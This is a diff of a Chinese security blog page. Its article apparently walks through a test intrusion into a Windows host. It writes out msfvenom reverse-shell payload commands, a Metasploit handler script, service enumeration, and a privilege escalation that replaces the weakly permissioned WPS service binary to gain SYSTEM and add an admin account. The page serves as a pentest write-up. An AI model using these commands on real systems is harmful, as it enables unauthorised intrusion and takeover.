@@ -35,15 +35,19 @@
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/aos/aos.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/animate/animate.min.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/lightGallery/css/lightgallery.min.css">
+	
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/matery.css">
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/css/my.css">
+	
+	<!--prism-->
+	<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.css">
+    <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/prism/prism.js" async ></script>
+
 
     <script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/libs/jquery/jquery.min.js"></script>
 	<script src="https://cdn.jsdelivr.net/gh/yanghaoi/yanghaoi.github.io/live2d-widget/autoload.js"></script>
-
 <meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="Yang Hao's blog" type="application/atom+xml">
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
-<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+</head>
 
 
 <body>
@@ -446,7 +450,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    920
+                    921
                 </div>
                 
 
@@ -465,11 +469,11 @@
             <div id="articleContent">
                 <h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。过程中两台机子都不通外网，本文记录一下获得会话并提权过程。 </p>
 <h4 id="2-获取msf会话"><a href="#2-获取msf会话" class="headerlink" title="2. 获取msf会话"></a>2. 获取msf会话</h4><p>生成一个exe载荷,看情况免杀：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=443 -f exe -o 666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="line-numbers language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=443 -f exe -o 666.exe</code></pre>
 <p>在准备让目标机执行我们的载荷前，先使用脚本(通过msfpc来生成)来快速监听会话，并进行一些自动进程迁移的工作：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">msfconsole -q -r '/home/yanghao/windows-meterpreter-staged-reverse-tcp-443-exe.rc'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="line-numbers language-shell">msfconsole -q -r '/home/yanghao/windows-meterpreter-staged-reverse-tcp-443-exe.rc'</code></pre>
 <p>脚本内容如下：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">use exploit/multi/handler
+<pre><code class="line-numbers language-shell">use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 192.168.122.135
 set LPORT 443
@@ -477,23 +481,23 @@ set ExitOnSession false
 set EnableStageEncoding true
 set EnableUnicodeEncoding true
 set AutoRunScript 'post/windows/manage/migrate' 
-run -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+run -j</code></pre>
 <p>参数的具体含义可以在设置了payload后执行show advanced查看:<br><img src="https://i.loli.net/2020/09/06/5v9ztK1OHNwClrm.png"><br>开始监听：<br><img src="https://i.loli.net/2020/09/06/EUw2GiQyRmSAg5L.png"><br>在目标机上执行生成的exe,获取会话：<br><img src="https://i.loli.net/2020/09/06/CpsugnLKoOMDT42.png"></p>
 <h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3. 尝试提权"></a>3. 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="https://i.loli.net/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="https://i.loli.net/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p>
 <p><img src="https://i.loli.net/2020/09/06/9eFRZGuTcUXVqAm.png" alt="whoami /priv"></p>
 <h5 id="local-exploit-suggester模块失败"><a href="#local-exploit-suggester模块失败" class="headerlink" title="local_exploit_suggester模块失败"></a>local_exploit_suggester模块失败</h5><p>试试自带的模块来检查提权漏洞：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">use post/multi/recon/local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="line-numbers language-shell">use post/multi/recon/local_exploit_suggester</code></pre>
 <p><img src="https://i.loli.net/2020/09/06/oBGYQmOS76RuW3b.png" alt="local_exploit_suggester"><br>发现有了一些漏洞，然后就加载对应的利用模块来进行尝试：<br><img src="https://i.loli.net/2020/09/06/gXSiGskL4K1hYaC.png" alt="失败1"></p>
 <p><img src="https://i.loli.net/2020/09/06/RqOQy21rmzaC79v.png" alt="失败2"></p>
 <p><img src="https://i.loli.net/2020/09/06/b6kiR7uDV5Y3QcJ.png" alt="失败3"></p>
 <h5 id="柳暗花明-enum-services利用"><a href="#柳暗花明-enum-services利用" class="headerlink" title="柳暗花明(enum_services利用)"></a>柳暗花明(enum_services利用)</h5><p>差不多模块都试了一下，因为有杀软的原因，都失败了。这时候想着找点新的exp来用用，但是网络不太方便，就先看看主机上的情况，先看了下主机上启动的服务情况：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">use post/windows/gather/enum_services<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="line-numbers language-shell">use post/windows/gather/enum_services</code></pre>
 <p><img src="https://i.loli.net/2020/09/06/vCjN63hxmKEnL9l.png" alt="查看服务"><br>发现了一个在D盘的服务(wpscloudsvr LocalSystem  “D:\Program Files\WPS Office\wpscloudsvr.exe” LocalService)：<br><img src="https://i.loli.net/2020/09/06/hdliZFzBrOeIA75.png" alt="wpscloudsvr.exe"><br>这里我们知道， 在C盘Windows,Program Files等目录下的文件都会被系统权限保护，而这个wpscloudsvr服务的可执行文件放在了D盘(这也是个很正常的事，总不能啥软件都往C盘装吧)，如果软件开发过程中未对这种类似服务的文件进行权限限制同时任意用户可以对其服务进行重启动，那么就可以利用替换该服务文件的方法来获得权限提升。接下来通过<code> cacls wpscloudsvr.exe</code> 查看文件权限，发现权限设置不当，标准用户可以对其更改(图找不到了，大概结果就像下面这样)，同时发现可以直接使用net命令来启动和停止其服务：<br><img src="https://i.loli.net/2020/09/06/pMJYBTNtlm3AfPq.png" alt="NT AUTHORITY\Authenticated Users:C"></p>
 <p>现在条件都满足了，生成个马给这个文件替换了，重新启动服务不就完成提权了吗？快速操作中…<br>1、使用msfvenom生成一个exe-service类型的载荷：</p>
-<pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=8522 -f exe-service -o wpscloudsvr.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="line-numbers language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=8522 -f exe-service -o wpscloudsvr.exe</code></pre>
 <p><img src="https://i.loli.net/2020/09/06/MYqaP8yu9nQf7XZ.png" alt="exe-service"><br>2、上传并启动服务,并获得了会话:</p>
-<pre class="line-numbers language-shell"><code class="language-shell">uplaod /xx/xx/wpscloudsvr.exe "D:\\Program Files\\WPS Office\\wpscloudsvr.exe"
-shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="line-numbers language-shell">uplaod /xx/xx/wpscloudsvr.exe "D:\\Program Files\\WPS Office\\wpscloudsvr.exe"
+shell&gt;net start wpscloudsvr</code></pre>
 <p><img src="https://i.loli.net/2020/09/06/kwdlUENItnpOHJ8.png"><br>这里就拿到了system权限的会话了：<br><img src="https://i.loli.net/2020/09/06/meE4iFVNKJnOBHf.png"></p>
 <p><img src="https://i.loli.net/2020/09/06/dj4W8KmTiaMIEtl.png"><br>后面就是上远程桌面看看，加个管理员账户什么的：<br><img src="https://i.loli.net/2020/09/06/orWRgGIUk7ZubB1.png"></p>
 <p><img src="https://i.loli.net/2020/09/06/6omMlNKGb3QZUz2.png"></p>
@@ -1013,7 +1017,7 @@ shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><s
 
         var selection = window.getSelection();
         // if the selection is short let's not annoy our users.
-        if (('' + selection).length < Number.parseInt('120')) {
+        if (('' + selection).length < Number.parseInt('1120')) {
             return;
         }
 
@@ -1178,7 +1182,7 @@ shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><s
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">37.8k</span>&nbsp;字
+                class="white-color">38.1k</span>&nbsp;字
             
             
             
